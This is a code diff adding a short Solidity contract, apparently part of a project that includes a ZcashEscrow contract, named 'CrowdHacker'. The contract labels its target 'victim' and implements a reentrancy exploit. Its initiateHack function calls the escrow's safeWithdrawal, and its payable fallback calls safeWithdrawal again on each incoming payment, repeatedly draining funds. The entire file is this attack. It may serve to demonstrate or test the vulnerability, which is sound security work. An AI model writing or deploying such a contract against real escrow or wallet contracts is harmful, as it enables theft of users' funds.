@@ -1,0 +1,18 @@
+pragma solidity ^0.4.1;
+
+import "./ZcashEscrow.solc";
+
+contract CrowdHacker {
+
+  ZcashEscrow victim;
+
+  function initiateHack(address _victim) {
+    victim = ZcashEscrow(_victim);
+    victim.safeWithdrawal();
+  }
+
+  function() payable {
+    victim.safeWithdrawal();
+  }
+
+}
